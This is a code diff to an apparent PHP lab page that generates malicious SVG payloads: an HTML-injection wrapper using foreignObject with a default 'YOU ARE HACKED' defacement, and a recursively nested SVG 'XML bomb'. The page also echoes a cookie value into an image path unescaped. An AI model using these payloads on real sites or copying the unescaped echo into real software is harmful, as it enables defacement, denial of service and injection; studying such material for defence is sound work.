@@ -38,24 +38,25 @@ if(isset($_POST['payload_submit'])){
     //if user choose html injection option as injection
     else if($_POST['inject_option']=='htmlInj'){
         if(!empty($_POST['html_payload'])){
-            $bypass1 = '<foreignObject class="node" x="2000" y="2000" width="4000" height="4000"><body xmlns="http://www.w3.org./1999/xhtml">';
+            $bypass1 = '<foreignObject class="node" x="100" y="100" width="400" height="400"><body xmlns="http://www.w3.org./1999/xhtml">';
             $bypass2 = '</body></foreignObject>';
             $payload = $bypass1 . $_POST['html_payload']. $bypass2;
 
         }
         else{
             
-        $payload='<foreignObject class="node" x="2000" y="2000" width="4000" height="4000"><body xmlns="http://www.w3.org./1999/xhtml"><h1 style="font-size: 600px"><a href="https://google.com/">YOU ARE HACKED</a></h1></body></foreignObject>';
+        $payload='<foreignObject class="node" x="100" y="100" width="400" height="400"><body xmlns="http://www.w3.org./1999/xhtml"><h1 style="font-size: 60px"><a href="https://google.com/">YOU ARE HACKED</a></h1></body></foreignObject>';
 
         }
     }
 
     //xml bomb
     else if($_POST['inject_option'] == 'xml'){
+        setcookie("xml",true);
         
         $payload='<defs>
         <g id="a0">
-            <circle stroke="#000000" fill="#fffff" fill-opacity="0.1" r="10" />
+            <circle stroke="#000000" fill="#7FFFD4" fill-opacity="0.5" r="50" />
         </g>
         <g id="a1">
             <use x="0" y="10" href="#a0" />
@@ -277,7 +278,7 @@ if(isset($_POST['payload_submit'])){
         <div class="row my-5">
                 <div class='col-sm-6'>
                     <h3>SVG Image embed in IMG tag</h3>
-                    <img src="<?php echo "User_SVG/".$_COOKIE['file'] ?>"><br>
+                    <img src="<?php if(isset($_COOKIE['xml']) && $_COOKIE['xml']==true){}else{echo "User_SVG/".$_COOKIE['file'];} ?>" width="500" height="600"><br>
                 </div>
                 <div class='col-sm-6'>
                     <h3>SVG XML</h3>
